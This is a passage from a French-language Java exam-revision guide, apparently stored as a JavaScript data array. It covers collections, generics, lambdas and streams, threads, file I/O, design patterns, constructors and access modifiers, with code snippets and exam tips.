17   Set < Integer > inter = new HashSet < >( a ) ;
18   inter . retainAll ( b ) ;      // {3 ,4}
20   Set < Integer > diff = new HashSet < >( a ) ;
21   diff . removeAll ( b ) ;       // {1 ,2}
23   // TreeSet : elements tries , O ( log n )
24   TreeSet < Integer > trie = new TreeSet < >( a ) ;
25   trie . first () ;    trie . last () ;
26   trie . floor (3) ; trie . ceiling (3) ;
27   trie . headSet (3) ;    trie . tailSet (3) ;

            Part IV

Génériques, Lambdas et Streams

         6|         Génériques (Generics)`},{id:"6.1",c:6,t:"Principes des génériques",x:`❖ Définition
     Les génériques permettent d'écrire du code type-safe et réutilisable pour différents types. Le
     type est spécifié à la compilation.

     ➣ Syntaxe / Code Classes et méthodes génériques

 1   // Classe generique
 2   public class Paire <A , B > {
 3       private A premier ;
 4       private B second ;
 6        public Paire ( A premier , B second ) {
 7            this . premier = premier ;
 8            this . second = second ;
 9        }
11        public A getPremier () { return premier ; }
12        public B getSecond () { return second ; }
14        @Override
15        public String toString () {
16            return " ( " + premier + " , " + second + " ) " ;
17        }
18   }
20   Paire < String , Integer > p = new Paire < >( " Ahmed " , 22) ;
21   // p . getPremier () retourne String , p . getSecond () retourne Integer
23   // Methode generique
24   public static <T extends Comparable <T > > T max ( T a , T b ) {
25       return a . compareTo ( b ) >= 0 ? a : b ;
26   }
27   // T doit implementer Comparable
29   // Wildcards
30   void afficher ( List <? > liste ) { ... }              // ? = n ' importe quel
        type
31   void lire ( List <? extends Number > liste ) { ... }   // Number ou sous -
        classe
32   void ajouter ( List <? super Integer > liste ) { ... } // Integer ou super -
        classe
34   // Conventions : T ( Type ) , E ( Element ) , K ( Key ) , V ( Value ) , N ( Number )

                                                       6.1.   PRINCIPES DES GÉNÉRIQUES

     ☞ Attention / Piège

 1   // Type erasure : les types generiques sont effaces a l ' execution
 2   List < String > ls = new ArrayList < >() ;
 3   List < Integer > li = new ArrayList < >() ;
 4   ls . getClass () == li . getClass () ; // true ( meme classe a l ' exec !)
 6   //   On ne peut pas :
 7   //   new T ()                  // pas d ' instanciation de T
 8   //   new T [10]                // pas de tableau de T
 9   //   instanceof T              // pas de test de type generique
11   // Pas de primitifs dans les generiques
12   // List < int > INTERDIT -> utiliser List < Integer >

        7|          Expressions Lambda et API Stream`},{id:"7.1",c:7,t:"Expressions Lambda (Java 8+)",x:`❖ Définition
     Une lambda est une fonction anonyme (implémentation d'une interface fonctionnelle).
     Syntaxe : (paramètres)   -> {corps} ou (paramètres) -> expression

     ➣ Syntaxe / Code Lambdas et références de méthodes

 1   // Interfaces fonctionnelles ( java . util . function )
 2   Predicate < Integer > estPair = n -> n % 2 == 0;
 3   estPair . test (4) ;   // true
 5   Function < String , Integer > longueur = s -> s . length () ;
 6   longueur . apply ( " Bonjour " ) ; // 7
 8   Consumer < String > afficher = s -> System . out . println ( s ) ;
 9   afficher . accept ( " Hello " ) ;
11   Supplier < String > date = () -> LocalDate . now () . toString () ;
12   date . get () ;   // "2024 -01 -15"
14   BiFunction < Integer , Integer , Integer > somme = (a , b ) -> a + b ;
15   somme . apply (3 , 4) ; // 7
17   Comparator < String > comp = ( s1 , s2 ) -> s1 . compareTo ( s2 ) ;
19   // References de methodes (::)
20   Consumer < String > aff1 = s -> System . out . println ( s ) ;
21   Consumer < String > aff2 = System . out :: println ;     // equivalent !
23   Function < String , Integer > len1 = s -> s . length () ;
24   Function < String , Integer > len2 = String :: length ; // methode instance
26   Supplier < ArrayList > newList1 = () -> new ArrayList () ;
27   Supplier < ArrayList > newList2 = ArrayList :: new ;  // constructeur`},{id:"7.2",c:7,t:"API Stream (Java 8+)",x:`❖ Définition
     Un Stream est un flux de données sur lequel on applique des opérations fonctionnelles (pipeline).
     Les streams sont lazy (exécutés à la demande) et non-réutilisables.

                                                                          7.2.   API STREAM (JAVA 8+)

     ➣ Syntaxe / Code Opérations Stream

 1   List < Etudiant > etudiants = new ArrayList < >() ;
 2   // Rempli avec des donnees ...
 4   // Pipeline : source -> operations intermediaires -> operation terminale
 6   // Operations intermediaires ( retournent un Stream , lazy )
 7   // filter , map , flatMap , sorted , distinct , limit , skip , peek
 9   // Operations terminales ( declenche l ' execution )
10   // forEach , collect , count , min , max , sum , average , reduce
11   // findFirst , findAny , anyMatch , allMatch , noneMatch , toArray
13   // Exemples
14   List < String > noms = etudiants . stream ()
15        . filter ( e -> e . getMoyenne () >= 10)         // filter
16        . sorted ( Comparator . comparing ( Etudiant :: getMoyenne ) . reversed () )
17        . map ( Etudiant :: getNom )                     // transformation
18        . distinct ()
19        . limit (5)
20        . collect ( Collectors . toList () ) ;           // terminal
22   // Statistiques
23   OptionalDouble moyGlobale = etudiants . stream ()
24       . mapToDouble ( Etudiant :: getMoyenne )
25       . average () ;
26   moyGlobale . ifPresent ( m -> System . out . println ( " Moy : " + m ) ) ;
28   long nbAdmis = etudiants . stream ()
29       . filter ( e -> e . getMoyenne () >= 10)
30       . count () ;
32   // Groupement ( Collectors . groupingBy )
33   Map < String , List < Etudiant > > parMention = etudiants . stream ()
34         . collect ( Collectors . groupingBy ( Etudiant :: getMention ) ) ;
36   // Jointure de chaines
37   String tousNoms = etudiants . stream ()
38       . map ( Etudiant :: getNom )
39       . collect ( Collectors . joining ( " , " , " [ " , " ] " ) ) ;
41   // reduce
42   int sommeAges = etudiants . stream ()
43       . mapToInt ( Etudiant :: getAge )
44       . reduce (0 , Integer :: sum ) ;
46   // Stream de primitifs
47   IntStream . range (0 , 10) . forEach ( System . out :: println ) ;
48   IntStream . of (1 , 2 , 3 , 4 , 5) . sum () ; // 15
50   // Stream parallele ( attention : ne pas utiliser si ordre important )
51   etudiants . parallelStream ()
52       . filter ( e -> e . getMoyenne () >= 14)
53       . forEach ( System . out :: println ) ;

               Part V

Threads, Fichiers et Design Patterns

        8|        Programmation Concurrente`},{id:"8.1",c:8,t:"Création de threads",x:`➣ Syntaxe / Code Threads en Java

 1   // Methode 1 : etendre Thread
 2   public class MonThread extends Thread {
 3       @Override
 4       public void run () {
 5           for ( int i = 0; i < 5; i ++) {
 6               System . out . println ( getName () + " : " + i ) ;
 7               try { Thread . sleep (100) ; } catch ( InterruptedException e ) {
 8                      Thread . currentThread () . interrupt () ;
 9               }
10           }
11       }
12   }
13   new MonThread () . start () ;
15   // Methode 2 : impl é menter Runnable ( preferable )
16   Runnable tache = () -> System . out . println ( " Thread : " + Thread .
          currentThread () . getName () ) ;
17   Thread t = new Thread ( tache , " MonThread " ) ;
18   t . start () ;
19   t . join () ;  // attend la fin du thread
21   // Methode 3 : ExecutorService ( recommande en production )
22   ExecutorService executor = Executors . newFixedThreadPool (4) ;
23   executor . submit (() -> System . out . println ( " Tache 1 " ) ) ;
24   executor . submit ( new MonThread () ) ;
25   executor . shutdown () ;     // attend la fin des taches
26   executor . awaitTermination (10 , TimeUnit . SECONDS ) ;
28   // Future et Callable ( retourne une valeur )
29   Callable < Integer > calcul = () -> {
30       Thread . sleep (1000) ;
31       return 42;
32   };
33   Future < Integer > futur = executor . submit ( calcul ) ;
34   int resultat = futur . get () ;  // bloque jusqu 'a la fin`},{id:"8.2",c:8,t:"Synchronisation",x:`➣ Syntaxe / Code synchronized et volatile

 1   // Probleme : acces concurrent a une variable partagee
 2   public class Compteur {
 3       private int valeur = 0;

                                                                 8.2.   SYNCHRONISATION

 5       // synchronized : un seul thread a la fois
 6       public synchronized void incrementer () {
 7           valeur ++;
 8       }
10       // Bloc synchronized ( verrou sur l ' objet )
11       public void decrementer () {
12           synchronized ( this ) {
13               valeur - -;
14           }
15       }
17       // Methode statique synchronisee ( verrou sur la classe )
18       public static synchronized void reset () { ... }
19   }
21   // AtomicInteger : operations atomiques sans synchronized
22   import java . util . concurrent . atomic . AtomicInteger ;
23   AtomicInteger compteur = new AtomicInteger (0) ;
24   compteur . incrementAndGet () ;      // atomique
25   compteur . compareAndSet (5 , 10) ; // CAS atomique
27   // volatile : assure la visibilite entre threads
28   private volatile boolean actif = true ;
30   // ReentrantLock : verrou explicite plus flexible
31   import java . util . concurrent . locks . ReentrantLock ;
32   ReentrantLock lock = new ReentrantLock () ;
33   lock . lock () ;
34   try {
35        // section critique
36   } finally {
37        lock . unlock () ; // TOUJOURS dans finally
38   }

        9|          Fichiers et E/S

     ➣ Syntaxe / Code Lecture et écriture de fichiers

 1   import java . io .*;
 2   import java . nio . file .*;
 4   // Lecture avec BufferedReader ( classique )
 5   try ( BufferedReader br = new BufferedReader (
 6            new FileReader ( " data . txt " ) ) ) {
 7       String ligne ;
 8       while (( ligne = br . readLine () ) != null ) {
 9            System . out . println ( ligne ) ;
10       }
11   }
13   // Ecriture avec BufferedWriter
14   try ( BufferedWriter bw = new BufferedWriter (
15             new FileWriter ( " out . txt " , true ) ) ) { // true = append
16       bw . write ( " Ligne 1\\ n " ) ;
17       bw . newLine () ;
18   }
20   // NIO .2 ( Java 7+) : Files et Paths
21   Path chemin = Paths . get ( " data . txt " ) ;
22   // ou : Path chemin = Path . of (" data . txt ") ;    // Java 11+
24   // Lire tout le fichier
25   List < String > lignes = Files . readAllLines ( chemin ) ;
26   String contenu = Files . readString ( chemin ) ; // Java 11+
28   // Ecrire
29   Files . write ( chemin , lignes ) ;
30   Files . writeString ( chemin , " contenu " , StandardOpenOption . APPEND ) ;
32   // Stream de lignes ( lazy )
33   Files . lines ( chemin )
34       . filter ( l -> l . startsWith ( " # " ) )
35       . forEach ( System . out :: println ) ;
37   // Informations sur le fichier
38   Files . exists ( chemin ) ;
39   Files . isDirectory ( chemin ) ;
40   Files . size ( chemin ) ;
41   Files . createDirectory ( Paths . get ( " dossier " ) ) ;
42   Files . copy ( src , dest , StandardCopyOption . REPLACE_EXISTING ) ;
43   Files . delete ( chemin ) ;
45   // Serialisation d ' objets ( classe doit implementer Serializable )
46   public class Personne implements Serializable {
47       private static final long serialVersionUID = 1 L ;
48       private String nom ;
49       // ...

50   }
52   // Ecriture
53   try ( ObjectOutputStream oos = new ObjectOutputStream (
54             new FileOutputStream ( " data . ser " ) ) ) {
55       oos . writeObject ( new Personne ( " Ahmed " ) ) ;
56   }
58   // Lecture
59   try ( ObjectInputStream ois = new ObjectInputStream (
60            new FileInputStream ( " data . ser " ) ) ) {
61       Personne p = ( Personne ) ois . readObject () ;
62   }

         10 | Design Patterns Essentiels`},{id:"10.1",c:10,t:"Patterns créateurs",x:`➣ Syntaxe / Code Singleton — une seule instance

 1   public class Singleton {
 2       // Volatile pour la visibilite entre threads
 3       private static volatile Singleton instance ;
 4       private int valeur ;
 6       private Singleton () {}   // constructeur prive
 8       // Double - checked locking ( thread - safe )
 9       public static Singleton getInstance () {
10           if ( instance == null ) {
11                synchronized ( Singleton . class ) {
12                     if ( instance == null ) {
13                          instance = new Singleton () ;
14                     }
15                }
16           }
17           return instance ;
18       }
19   }
21   // Version Enum ( meilleure pratique Java )
22   public enum Singleton {
23       INSTANCE ;
24       public void operation () { ... }
25   }
26   Singleton . INSTANCE . operation () ;

     ➣ Syntaxe / Code Factory Method et Builder

 1   // Factory Method
 2   public abstract class Animal {
 3       public abstract String parler () ;
 4       // Factory method
 5       public static Animal creer ( String type ) {
 6           return switch ( type ) {
 7               case " chien " -> new Chien () ;
 8               case " chat " -> new Chat () ;
 9               default -> throw new IllegalArgumentException ( type ) ;
10           };
11       }
12   }
13   Animal a = Animal . creer ( " chien " ) ;
15   // Builder Pattern
16   public class Etudiant {

                                    10.2.   PATTERNS STRUCTURELS ET COMPORTEMENTAUX

17        private String nom ;
18        private int age ;
19        private double moyenne ;
21        private Etudiant () {}
23        public static class Builder {
24            private Etudiant e = new Etudiant () ;
26             public   Builder nom ( String nom ) { e . nom = nom ; return this ; }
27             public   Builder age ( int age ) { e . age = age ; return this ; }
28             public   Builder moyenne ( double m ) { e . moyenne = m ; return this ; }
29             public   Etudiant build () { return e ; }
30        }
31   }
33   Etudiant e = new Etudiant . Builder ()
34       . nom ( " Ahmed " ) . age (22) . moyenne (15.5)
35       . build () ;`},{id:"10.2",c:10,t:"Patterns structurels et comportementaux",x:`➣ Syntaxe / Code Observer — notification d'événements

 1   // Interface Observer
 2   public interface Observateur {
 3       void mettreAJour ( String evenement ) ;
 4   }
 6   // Sujet ( Observable )
 7   public class Sujet {
 8       private List < Observateur > obs = new ArrayList < >() ;
10        public void ajouter ( Observateur o ) { obs . add ( o ) ; }
11        public void supprimer ( Observateur o ) { obs . remove ( o ) ; }
13        public void notifier ( String ev ) {
14            obs . forEach ( o -> o . mettreAJour ( ev ) ) ;
15        }
16   }
18   // Observateur concret
19   public class LogObservateur implements Observateur {
20       @Override
21       public void mettreAJour ( String ev ) {
22           System . out . println ( " [ LOG ] " + ev ) ;
23       }
24   }

     ➣ Syntaxe / Code Strategy — algorithme interchangeable

 1   // Interface Strategy
 2   public interface TriStrategie {
 3       void trier ( int [] tableau ) ;

                                      10.2.   PATTERNS STRUCTURELS ET COMPORTEMENTAUX

 4   }
 6   // Implementations
 7   public class TriBulle implements TriStrategie {
 8       @Override
 9       public void trier ( int [] tab ) { /* bubble sort */ }
10   }
12   public class TriRapide implements TriStrategie {
13       @Override
14       public void trier ( int [] tab ) { /* quick sort */ }
15   }
17   // Contexte
18   public class Trieur {
19       private TriStrategie strategie ;
21           public Trieur ( TriStrategie strategie ) {
22               this . strategie = strategie ;
23           }
25           public void setStrategie ( TriStrategie s ) { this . strategie = s ; }
26           public void trier ( int [] tab ) { strategie . trier ( tab ) ; }
27   }
29   // Avec lambda ( strategy fonctionnelle )
30   Trieur t = new Trieur ( tab -> Arrays . sort ( tab ) ) ;

     ➔ Résumé rapide Design Patterns à connaître

         Famille          Pattern              Intent

         Créateur         Singleton            Une seule instance
         Créateur         Factory Method       Création déléguée à des sous-classes
         Créateur         Abstract Factory     Familles d'objets liés
         Créateur         Builder              Construction étape par étape
         Structurel       Adapter              Adaptateur d'interface incompatible
         Structurel       Decorator            Ajout de responsabilités dynamique
         Structurel       Facade               Interface simplifiée
         Comportemental   Observer             Notification de changements
         Comportemental   Strategy             Algorithme interchangeable
         Comportemental   Template Method      Squelette d'algorithme
         Comportemental   Iterator             Parcours d'une collection

    Part VI

Examens Blancs

        11 | Examen Blanc 1 — Java Fondamental

    ★ Astuce Concours
    Stratégie concours Java :
       1. Tracez l'exécution ligne par ligne mentalement
       2. Vérifiez les types : primitif vs objet, upcast vs downcast
       3. Attention à la différence == vs equals() pour les objets
       4. Lisez les @Override : la méthode appelée dépend du type réel (liaison dynamique)
       5. Pour les exceptions : checked = oblig. traiter ; unchecked = optionnel`},{id:"14.1",c:14,t:"Explications des codes Java",x:`14.1.1      POO – Héritage et Polymorphisme

  ❍ Note Comment lire un code Java avec héritage
  Règle de base : en Java, toute méthode non-static, non-final, non-private est virtuelle
  par défaut (liaison dynamique). La méthode appelée dépend du type réel de l'objet, pas du
  type déclaré.
  Méthode pour analyser :
       1. Identifier le type déclaré (à gauche de =) et le type réel (après new).
       2. Pour un appel de méthode : chercher la méthode dans le type réel (redéfinition ? sinon
            remonter la hiérarchie).
       3. Pour une surcharge (overload) : le choix se fait à la compilation selon les types déclarés
            des arguments.
       4. Pour une redéfinition (override) : le choix se fait à l'exécution selon le type réel.

14.1.2      Collections – Comment choisir

  ❍ Note Choisir la bonne collection

       Collection            Ordre              Doublons                  Complexité

       ArrayList             Oui (insertion)    Oui                       Accès O(1), insert O(n)
       LinkedList            Oui (insertion)    Oui                       Accès O(n), insert O(1)
       HashSet               Non                Non                       O(1) moy.
       TreeSet               Trié (naturel)     Non                       O(log n)
       HashMap               Non                Clés uniques              O(1) moy.
       TreeMap               Trié par clé       Clés uniques              O(log n)

14.1.3      Exceptions – try/catch/finally

  ❍ Note Lecture d'un bloc try-catch
  Ordre d'exécution :
       1. Le code dans try s'exécute.
       2. Si une exception est levée, le premier catch compatible l'attrape.
        finally s'exécute toujours (même après un return !).
       3.
     4. try-with-resources : les objets AutoCloseable sont fermés automatiquement.
  Hiérarchie : Throwable → Error (système) ou Exception → RuntimeException (non vérifiée)
  ou vérifiée (à déclarer avec throws).

                                                          14.2.   DÉFINITIONS JAVA À MÉMORISER

14.1.4      Streams (Java 8+) – Comment lire

  ❍ Note Pipeline de Streams
  Règle : les Streams sont lazy (paresseux). Rien ne s'exécute tant qu'il n'y a pas d'opération
  terminale.
  Types d'opérations :
        Intermédiaires (lazy) : filter(), map(), sorted(), distinct(), limit(), flatMap().
        Terminales (déclenchent le pipeline) : collect(), forEach(), count(), reduce(),
         findFirst(), anyMatch().`},{id:"14.2",c:14,t:"Définitions Java à mémoriser",x:`❖ Définition Glossaire Java

   Terme                     Définition

   JVM                       Machine virtuelle qui exécute le bytecode Java (portabilité).
   JDK                       Kit de développement (compilateur javac + JRE + outils).
   JRE                       Environnement d'exécution (JVM + bibliothèques).

   Encapsulation             Protéger l'état interne (private) et exposer des méthodes (public).
   Héritage                  Spécialiser une classe (extends).     Java = héritage   simple pour les
                             classes.
   Polymorphisme             Traiter des objets différents via un type commun.     Liaison dynamique
                             par défaut.
   Abstraction               Classe abstract ou interface : définir un contrat sans implémentation.

   Interface                 Contrat pur : méthodes abstraites (+ default/static depuis Java 8).
   Classe abstraite          Peut contenir des méthodes implémentées ET abstraites. Non instancia-
                             ble.
   final                     Classe : non héritable.    Méthode : non redéfinissable.   Variable : non
                             réassignable.
   static                    Appartient à la classe, pas à une instance.

   Overriding                Redéfinition d'une méthode héritée (même signature).             Décision à
                             l'exécution.
   Overloading               Surcharge : même nom, signatures différentes. Décision à la compilation.
   Autoboxing                Conversion automatique int ↔ Integer.
   Génériques                List<String> : typage paramétré, vérifié à la compilation (type erasure
                             à l'exécution).
   Lambda                    Fonction anonyme :   (params) -> expression. Requiert une interface
                             fonctionnelle.`},{id:"14.3",c:14,t:"Règles fondamentales à mémoriser",x:`★ Astuce Concours 25 règles d'or Java
       1. == compare les références pour les objets ; equals() compare le contenu.
       2. Division entière : 7/2= 3. Pour 3.5 : 7.0/2 ou (double)7/2.
       3. final variable : ne peut pas être réassignée, mais l'objet peut être modifié.
       4. Liaison dynamique : la méthode appelée dépend du type réel, pas du type déclaré.

                                                          14.4.   PIÈGES FRÉQUENTS AU CONCOURS

       5.   super() doit être la première instruction d'un constructeur fils.
       6. Si aucun constructeur n'est défini    ⇒ Java génère un constructeur par défaut (sans
            paramètre).
       7. Si on définit un constructeur avec paramètres, le constructeur par défaut disparaît.
       8. Redéfinir equals() implique de redéfinir hashCode().
       9. Les champs d'instance ont une valeur       par défaut (0, false, null). Les variables locales
            non.
   10.      String est immuable. Utiliser StringBuilder pour la concaténation en boucle.
   11.      HashMap : O(1) ; TreeMap : O(log n) trié ; ArrayList : accès O(1).
   12. Les Streams sont lazy : rien ne s'exécute sans opération terminale.
   13. Interface fonctionnelle = exactement 1 méthode abstraite ⇒ utilisable avec lambda.
   14. abstract : méthode sans corps, la sous-classe doit l'implémenter.
   15. Une interface ne peut pas avoir de constructeur.
   16. this = référence à l'objet courant. super = référence à la classe parente.
   17. static : accessible sans créer d'instance. Ne peut pas accéder à this.
   18. try-with-resources ferme automatiquement les ressources AutoCloseable.
   19. RuntimeException (non vérifiée) : pas besoin de throws. Exception vérifiée : throws
            obligatoire.
   20.      Thread.start() lance un nouveau thread. run() appelé directement = appel normal
            (pas de thread).
   21.      synchronized : un seul thread à la fois dans la section critique.
   22.      volatile : la variable est lue/
            'ecrite directement en mémoire (pas de cache thread).
   23. Pattern Singleton : une seule instance.         Strategy : changer l'algorithme à l'exécution.
            Observer : notifier des changements. Factory : créer des objets sans exposer la logique.
   24.      ArrayList vs LinkedList : préférer ArrayList sauf insertion/suppression fréquente au
            milieu.
   25. Un enum en Java est une classe complète (peut avoir des méthodes, des champs).`},{id:"14.4",c:14,t:"Pièges fréquents au concours",x:`☞ Attention / Piège 15 pièges classiques Java

       1. == sur des objets String créés avec new ⇒ false (références différentes).
       2. equals() non redéfini ⇒ compare les références (comme ==).
       3. NullPointerException : appeler une méthode sur null.
       4. ArrayIndexOutOfBoundsException : accéder hors limites.
       5. Oublier break dans switch ⇒ fall-through (exécute les cas suivants).
       6. Integer cache : == fonctionne pour [−128, 127] mais pas au-delà.
       7. ArrayList modifiée pendant un for-each ⇒ ConcurrentModificationException.
       8. finally s'exécute même après un return dans try ou catch.
       9. Un constructeur qui appelle une méthode redéfinie ⇒ comportement inattendu (l'objet n'est
            pas encore complètement construit).
   10. static ne peut pas être redéfini (pas de polymorphisme sur les méthodes statiques).
   11. private n'est pas hérité. protected est accessible dans le package ET les sous-classes.
   12. Comparable : comparaison naturelle (une seule).      Comparator : comparaison externe
            (plusieurs possibles).
   13. Génériques : List<Integer> pas List<int>. Les types primitifs ne sont pas acceptés.
   14. ++compteur n'est PAS atomique en multithreading.         Utiliser AtomicInteger                 ou
       synchronized.
   15. Thread.run() ne crée PAS de thread. Utiliser Thread.start().`},{id:"11.1",c:11,t:"Les approches de la programmation",x:`❖ Définition
     Il existe quatre grandes approches de la programmation, chacune apportant des améliorations
     par rapport à la précédente :

     ➔ Résumé rapide Les 4 approches

      Approche        Principe                              Limite principale

      Linéaire        Suite d'instructions séquentielle     Pas de réutilisation du code
      Procédurale     Découpage en fonctions/procédures     Non évolutive (cascade de bugs)
      Modulaire       Découpage en modules compilés         Données séparées des fonctions
      Orientée Objet  Données + traitements = objets       Complexité de conception

     ◆ Concept clé
     L'approche linéaire : une suite d'instructions exécutées ligne après ligne. Simple mais
     impossible à maintenir pour de grosses applications. Le code se répète partout.

     L'approche procédurale : découpe le programme en fonctions réutilisables. Avantage :
     code modulaire et structuré. Limite : une mise à jour peut impacter en cascade d'autres fonctions.

     L'approche modulaire : fractionne en fichiers sources (modules) compilés séparément.
     Avantage : compilation rapide, développement réparti. Limite : données dissociées des fonctions.

     L'approche orientée objet : regroupe données + traitements dans des entités appelées objets.
     Les objets communiquent via des messages. Les classes sont les modèles génériques des objets.

     ★ Astuce Concours
     La POO est caractérisée par 4 piliers fondamentaux :
      — Encapsulation : cacher la complexité (interface publique + implémentation cachée)
      — Abstraction : modéliser les concepts essentiels
      — Héritage : créer des classes spécialisées à partir de classes existantes
      — Polymorphisme : traiter des objets différents de manière uniforme`},{id:"11.2",c:11,t:"Encapsulation, Objet et Classe",x:`❖ Définition
     L'encapsulation (ou abstraction) permet de masquer la complexité des objets à l'utilisateur.
     Un objet possède une interface (visible) et une implémentation (cachée).
     Exemple : un enfant utilise un téléviseur sans savoir comment il fonctionne.

     ◆ Concept clé
     Un objet est une entité qui possède :
      — Une identité : permet de le distinguer des autres objets
      — Un état : les attributs (variables stockant les informations)
      — Un comportement : les méthodes (actions possibles sur l'objet)

     Objet = identité + état (attributs) + comportement (méthodes)

     ◆ Concept clé
     Une classe est un mécanisme permettant de créer des objets ayant des propriétés communes.
     Un objet est une instance de sa classe, créé avec l'opérateur new.

     Classe = instanciation + attributs (variables d'instances) + méthodes membres

     Les attributs ont un nom et un type (primitif ou classe).
     Les méthodes peuvent modifier l'état de l'objet et retourner des valeurs.

     ❖ Définition
     L'héritage est un principe de transmission des propriétés d'une classe vers une sous-classe.
     Il permet de définir de nouveaux attributs/méthodes qui s'ajoutent à ceux hérités,
     créant une hiérarchie de classes de plus en plus spécialisées.
      — Héritage simple : une classe hérite d'une seule superclasse (Java)
      — Héritage multiple : hériter de plusieurs superclasses (C++, interdit en Java)

     ❖ Définition
     Le polymorphisme permet à une classe dérivée de redéfinir une méthode héritée.
     Un même appel de méthode peut s'appliquer à des objets de classes différentes,
     chacun répondant selon sa propre implémentation.`},{id:"12.1",c:12,t:"Constructeurs en détail",x:`❖ Définition
     Un constructeur est une méthode spéciale invoquée lors de la création d'un objet (new).
     Il a le même nom que la classe et n'a aucune valeur de retour.
     Si aucun constructeur n'est défini, Java fournit un constructeur par défaut implicite.

     ➣ Syntaxe / Code Constructeurs

 1   public class Vehicule {
 2       int age ;
 3       float poids ;
 4       boolean moteur ;
 5
 6       // Constructeur par défaut (sans paramètres)
 7       Vehicule() {
 8           age = 0 ;
 9           poids = 0.0F ;
10           moteur = false ;
11       }
12
13       // Constructeur avec paramètres (surcharge)
14       Vehicule(int a, float p, boolean m) {
15           age = a ;
16           poids = p ;
17           moteur = m ;
18       }
19   }
20
21   // Création d'objets
22   Vehicule V1 = new Vehicule() ;           // constructeur par défaut
23   Vehicule V2 = new Vehicule(2, 1.5F, true) ; // constructeur paramétré

     ◆ Concept clé
     L'opérateur new :
      — Demande à la JVM l'espace mémoire nécessaire
      — Appelle le constructeur pour initialiser l'objet
      — Renvoie une référence vers l'objet instancié
      — Si pas assez de mémoire → OutOfMemoryError

     ➣ Syntaxe / Code Réutilisation des constructeurs avec super

 1   public class Point {
 2       double x, y ;
 3       public Point(double x, double y) {
 4           // super() ; appel implicite du constructeur de Object
 5           this.x = x ; this.y = y ;
 6       }
 7   }
 8
 9   public class PointCouleur extends Point {
10       Color c ;
11       public PointCouleur(double x, double y, Color c) {
12           super(x, y) ;   // DOIT être la 1ère instruction !
13           this.c = c ;
14       }
15   }

     ☞ Attention / Piège
      — super(paramètres) doit toujours être la 1ère instruction du constructeur
      — Si pas d'appel explicite à super(), Java insère implicitement super()
      — Si la classe mère n'a pas de constructeur sans paramètre, erreur de compilation !`},{id:"12.2",c:12,t:"Durée de vie et finaliseurs",x:`❖ Définition
     La durée de vie d'un objet en Java passe par 3 étapes :
      1. Déclaration et instanciation (new)
      2. Utilisation (appel de méthodes)
      3. Suppression automatique par le Garbage Collector

     ◆ Concept clé
     Java gère automatiquement la mémoire ! Pas de delete comme en C++.
     Le ramasse-miettes (garbage collector) libère la mémoire des objets non référencés.

     ➣ Syntaxe / Code Copie d'objets et clone()

 1   // Copie de référence (même objet !)
 2   MaClasse m1 = new MaClasse() ;
 3   MaClasse m2 = m1 ;    // m1 et m2 pointent sur LE MÊME objet
 4
 5   // Copie réelle avec clone() (objets indépendants)
 6   MaClasse m1 = new MaClasse() ;
 7   MaClasse m2 = m1.clone() ;  // m1 et m2 sont des objets DIFFÉRENTS
 8
 9   // Pour utiliser clone(), la classe doit implémenter Cloneable
10   public class Salarie implements Cloneable {
11       public Object clone() throws CloneNotSupportedException {
12           return super.clone() ;
13       }
14   }

     ➣ Syntaxe / Code Les finaliseurs

 1   // finalize() est appelé automatiquement par le GC avant destruction
 2   public class MonObjet {
 3       // Ressources à libérer (fichiers, connexions, etc.)
 4       protected void finalize() {
 5           // Code de nettoyage
 6           System.out.println("Objet détruit") ;
 7       }
 8   }

     ☞ Attention / Piège
      — m2 = m1 ne copie PAS l'objet, seulement la référence !
      — Pour clone(), la classe DOIT implémenter l'interface Cloneable
      — Sans Cloneable → CloneNotSupportedException
      — finalize() est déprécié depuis Java 9, préférer try-with-resources`},{id:"12.3",c:12,t:"Packages Java",x:`❖ Définition
     Un package regroupe un ensemble de classes sous un même espace de nommage.
     Les noms suivent le schéma : name.subname (ex: java.util, java.io)

     ➣ Syntaxe / Code Déclaration et utilisation des packages

 1   // Déclarer qu'une classe appartient à un package
 2   package MonApp.models ;     // en début du fichier
 3   public class Toto { ... }
 4   // Le fichier doit être dans : MonApp/models/Toto.java
 5
 6   // Importer une classe spécifique
 7   import MonApp.models.Toto ;
 8
 9   // Importer toutes les classes d'un package
10   import MonApp.models.* ;
11
12   // Utilisation directe sans import
13   MonApp.models.Toto t = new MonApp.models.Toto() ;

     ➔ Résumé rapide Packages Java standards importants

      Package          Description

      java.lang        Classes de base (importé par défaut !)
      java.util        Classes utilitaires (Collections, Date, Scanner)
      java.io          Entrées/sorties fichiers
      java.nio         New I/O (Java 7+)
      java.net         Réseau (Socket, URL)
      java.sql         Accès bases de données
      javax.swing      Composants graphiques Swing
      java.awt         Composants graphiques AWT

     ★ Astuce Concours
     java.lang est le seul package importé automatiquement !
     C'est pourquoi on utilise String, Math, System, Integer sans import.
     Pour tout autre package, l'import est obligatoire.`},{id:"12.4",c:12,t:"Modificateurs d'accès et encapsulation",x:`❖ Définition
     La portée d'un membre (attribut/méthode) est contrôlée par 4 modificateurs d'accès :
      — public : accessible partout
      — protected : accessible dans la classe, le package, et les sous-classes
      — (défaut) : accessible uniquement dans le même package
      — private : accessible uniquement dans la classe

     ➔ Résumé rapide Tableau des accès

                              public   protected   défaut   private

      Même classe              Oui       Oui        Oui      Oui
      Même package             Oui       Oui        Oui      Non
      Sous-classe autre pkg    Oui       Oui        Non      Non
      Classe quelconque        Oui       Non        Non      Non

     ➣ Syntaxe / Code Getters et Setters (Accesseurs/Mutateurs)

 1   public class Etudiant {
 2       private String nom ;     // attribut privé → encapsulé
 3       private int age ;
 4
 5       // Getter : accéder à la valeur
 6       public String getNom() { return nom ; }
 7       public int getAge() { return age ; }
 8
 9       // Setter : modifier la valeur (avec validation)
10       public void setNom(String nom) {
11           this.nom = nom ;
12       }
13       public void setAge(int age) {
14           if (age >= 0 && age <= 120)
15               this.age = age ;
16           else
17               throw new IllegalArgumentException("Age invalide") ;
18       }
19   }

     ☞ Attention / Piège
      — Les classes ne peuvent être que public ou défaut (pas private, pas protected)
      — Un constructeur private empêche l'instanciation depuis l'extérieur (pattern Singleton)
      — Sans getter/setter, impossible d'accéder à un attribut private en dehors de la classe
      — private est la meilleure façon d'encapsuler (cacher l'implémentation)`},{id:"12.5",c:12,t:"Le mot-clé this et variables statiques",x:`❖ Définition
     this désigne l'instance courante de la classe. Il est utilisé pour :
      — Désambiguïser : distinguer attribut et paramètre de même nom
      — S'auto-référencer : passer l'objet courant en paramètre
      — Appeler un autre constructeur : this(paramètres)

     ➣ Syntaxe / Code Utilisations de this

 1   // 1. Désambiguïser attribut vs paramètre
 2   public class Calculateur {
 3       protected int valeur ;
 4       public void calcule(int valeur) {
 5           this.valeur = this.valeur + valeur ;  // this.valeur = attribut
 6       }
 7   }
